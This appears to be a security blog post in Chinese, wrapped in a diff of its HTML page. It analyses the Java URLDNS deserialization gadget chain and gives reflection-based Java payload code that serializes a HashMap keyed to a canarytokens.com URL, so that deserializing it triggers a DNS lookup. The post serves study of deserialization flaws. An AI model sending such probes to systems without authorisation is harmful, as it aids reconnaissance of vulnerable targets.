@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ycycyc - URLDNS链</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/tailwind.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/toc.css">
+    
+<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
+    <div class="container mx-auto flex items-center justify-between space-x-8">
+    
+      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
+        <a href="/" class="hover:text-white transition-colors select-none">
+          ycycyc
+        </a>
+      </h1>
+  
+    <!-- 大屏幕 -->
+      <nav class="hidden md:block">
+        <ul class="flex space-x-6">
+          
+            <li>
+              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Home
+              </a>
+            </li>
+          
+            <li>
+              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Archives
+              </a>
+            </li>
+          
+            <li>
+              <a href="/categories" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Categories
+              </a>
+            </li>
+          
+            <li>
+              <a href="/tags" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Tags
+              </a>
+            </li>
+          
+            <li>
+              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                About
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+  
+      <!-- 小屏幕 -->
+      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+        </svg>
+      </button>
+    </div>
+  
+    <!-- 折叠菜单 -->
+    <nav id="mobile-menu" class="hidden bg-black">
+      <ul class="space-y-2 py-4 px-6">
+        
+          <li>
+            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
+              Home
+            </a>
+          </li>
+        
+          <li>
+            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
+              Archives
+            </a>
+          </li>
+        
+          <li>
+            <a href="/categories" class="block text-white hover:text-hacker-color1 transition-colors">
+              Categories
+            </a>
+          </li>
+        
+          <li>
+            <a href="/tags" class="block text-white hover:text-hacker-color1 transition-colors">
+              Tags
+            </a>
+          </li>
+        
+          <li>
+            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
+              About
+            </a>
+          </li>
+        
+      </ul>
+    </nav>
+   <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F9W89HDHWL"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-F9W89HDHWL');
+</script>
+  
+    <!-- RSS Link -->
+    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
+  </header>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="/js/search.js"></script>
+  <script>
+        document.addEventListener("DOMContentLoaded", () => {
+    const menuToggle = document.getElementById("menu-toggle");
+    const mobileMenu = document.getElementById("mobile-menu");
+
+    menuToggle.addEventListener("click", () => {
+        if (mobileMenu.classList.contains("hidden")) {
+        mobileMenu.classList.remove("hidden");
+        } else {
+        mobileMenu.classList.add("hidden");
+        }
+    });
+    });
+
+  </script>
+  
+
+    <style>
+        p {
+            margin-top: 0 !important;
+            margin-bottom: 1rem !important;
+            font-size: 1.1rem;
+        }
+        figure {
+            margin: 0 !important;
+        }
+        pre {
+            padding: 0 !important;
+            margin-top: 0 !important;
+            margin-bottom: 1rem !important;
+        }
+        td {
+            padding: 0 !important;
+            margin-bottom: 1rem !important;
+        }
+        h1, h2, h3, h4, h5, h6 {
+            margin-top: 0 !important;
+            margin-bottom: 1rem !important;
+        }
+        @media (min-width: 1024px) {
+            #middle-box {
+                min-width: 56rem;
+            }
+        }
+    </style>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="bg-black text-hacker-color3 container mx-auto" style="overflow-x:hidden">
+    <!-- 文章标题 -->
+    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">URLDNS链</h1>
+
+    <!-- 发布时间 -->
+    <p class="text-hacker-color3 text-center text-sm mb-4">
+        2025-07-23
+    </p>
+
+    <!-- 文章内容 -->
+    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight" style="display: flex;">
+        <div id="middle-box">
+            <h3 id="官方的利用链"><a href="#官方的利用链" class="headerlink" title="官方的利用链"></a>官方的利用链</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token class-name">HashMap</span><span class="token punctuation">.</span><span class="token function">putVal</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token class-name">HashMap</span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+			<span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="复现-分析"><a href="#复现-分析" class="headerlink" title="复现(分析)"></a>复现(分析)</h3><p>我们先跟到HashMap类中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250721154329522.png" alt="image-20250721154329522"></p>
+<p>找到<code>HashMap的readObject()</code>方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250721154938389.png" alt="image-20250721154938389"></p>
+<p>可以看到这里调用了hash方法，跟进一下这个hash方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250721155435787.png" alt="image-20250721155435787"></p>
+<p>可以看到这里还调用了一个hashcode方法，这里先保留一下。</p>
+<p>这里再跟进一下URL,在URL类里面找到一个常见的函数：hashcode函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250721155627746.png" alt="image-20250721155627746"></p>
+<p>跟进这个hashCode函数发现，发现这里调用了handler里面的hashcode函数，继续跟进</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250721155821719.png" alt="image-20250721155821719"></p>
+<p>关键就是这里调用了一个<code>getHostAddress</code>函数，这个函数的作用就是直接翻译(根据域名来获取地址)，就会进行一个域名解析的工作，也就是说调用URL类的<code>hashCode</code>函数就可以得到一个<code>DNS</code>请求，就可以验证漏洞是否存在。</p>
+<p>这里就可以总结一下利用链：</p>
+<pre class="line-numbers language-none"><code class="language-none">HashMap-&gt;readObject()
+HashMap-&gt;hash()
+HashMap-&gt;hansh()-&gt;hashCode()
+URL-&gt;hashCode()
+handler-&gt;getHostAddress()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="复现-利用"><a href="#复现-利用" class="headerlink" title="复现(利用)"></a>复现(利用)</h3><p>首先在序列化的测试文件中添加下面的测试代码：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> hashmap<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://1tly1ablpqr45tvjwcssc28ec.canarytokens.com"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">serialize</span><span class="token punctuation">(</span>hashmap<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>URL是测试是否产生了URLDNS请求的网址：</p>
+<p>这里我使用的是<a target="_blank" rel="noopener" href="https://canarytokens.org/nest/">创建新的金丝雀代币</a>这个在线网址，如果目标URL产生了DNS请求就会在我们填写的邮件提醒。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250722231825468.png" alt="image-20250722231825468"></p>
+<p>进行序列化：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250722231850368.png" alt="image-20250722231850368"></p>
+<p>按照道理这里是不会产生DNS请求的，但是这里我的右键是收到了提醒的，说明产生了DNS请求。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250722231951054.png" alt="image-20250722231951054"></p>
+<p><strong>为什么说这里本不应该产生DNS请求(进行域名解析)的呢？</strong></p>
+<p>因为在hashmap定义的writeObject方法中，只会直接写入键值对的原始数据，而不会进行任何请求的操作。</p>
+<p><strong>那么问题就是这里为什么会收到DNS请求呢？</strong></p>
+<p>实际上在序列化的上一步操作也就是</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250722233908450.png" alt="image-20250722233908450"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250722233927255.png" alt="image-20250722233927255"></p>
+<p>hashmap在调用put方法的时候就会调用hash方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250722234018811.png" alt="image-20250722234018811"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250722234053517.png" alt="image-20250722234053517"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250722234141518.png" alt="image-20250722234141518"></p>
+<p>也就会调用到hashcode函数，也就是会直接调用到这里的getHostAddress()方法，产生URLDNS请求了。</p>
+<p>(会产生这种情况的前提就是当 <code>hashCode</code> 的值不等于 -1 的时候，函数就会直接 <code>return hashCode</code> 而不执行 <code>hashCode = handler.hashCode(this);</code>。而一开始定义 HashMap 类的时候<code>hashCode</code> 的值为 -1，便是发起了请求)</p>
+<p>那么怎么解决这种情况给出的错误信息呢？</p>
+<p>这里就要利用上面提到的反射的知识了，首先将hashCode的值更改为不是-1的值，再将hashCode的值改回-1。</p>
+<p>payload：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 这里不要发起请求</span>
+<span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://1tly1ablpqr45tvjwcssc28ec.canarytokens.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//创建一个 URL 对象，指向攻击者控制的域名</span>
+<span class="token class-name">Class</span> c <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取 URL 对象的 Class 对象</span>
+<span class="token class-name">Field</span> hashcodefile <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取 URL 类的 hashCode 私有字段</span>
+hashcodefile<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//解除私有字段的访问限制</span>
+hashcodefile<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//将 URL 对象的 hashCode 设为 1234</span>
+hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//将 URL 作为键存入 HashMap，其实是hashmap.put(new URL("http://1tly1ablpqr45tvjwcssc28ec.canarytokens.com"),1);部分的替换</span>
+hashcodefile<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//将 hashCode 重置为 -1</span>
+<span class="token function">serialize</span><span class="token punctuation">(</span>hashmap<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250723002159385.png" alt="image-20250723002159385"></p>
+<p>运行序列化并没有收到URLDNS请求</p>
+<p>下面反序列化</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250723002701489.png" alt="image-20250723002701489"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/blogimg@main/img/image-20250723002624068.png" alt="image-20250723002624068"></p>
+<p>可以看到收到了URLDNS请求说明就是操作成功了。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>最后总结这条链的反序列化的利用过程：</strong></p>
+<p>入口类A HashMap 接受一个参数o</p>
+<p>目标类B URL</p>
+<p>目标是调用B.f</p>
+<p>A.reaObject-&gt;B.f(o.f，将B的这个URL传入当作这个o，就相当于B.f)</p>
+
+        </div>
+        
+            <div class="post-container">
+                <aside class="toc-container">
+                    <button class="toc-toggle">文章目录</button>
+                    <nav class="toc" id="toc"></nav>
+                </aside>
+            </div>
+        
+    </div>
+    
+    <!-- 评论系统 -->
+    
+
+    <!-- 返回主页链接 -->
+    <div class="text-center my-8">
+        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
+    </div>
+
+    <script src="/js/toc.js"></script>  <!-- 引入 TOC 逻辑 -->
+    <footer class="bg-black text-gray-400 py-4">
+    <div class="container mx-auto text-center">
+      <p>© <span id="current-year"></span>  ycycyc 
+        <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
+    </div>
+  </footer>
+  
+  <script> 
+    document.getElementById("current-year").textContent = new Date().getFullYear();
+  </script>
+  
+
+</body>
+</html>
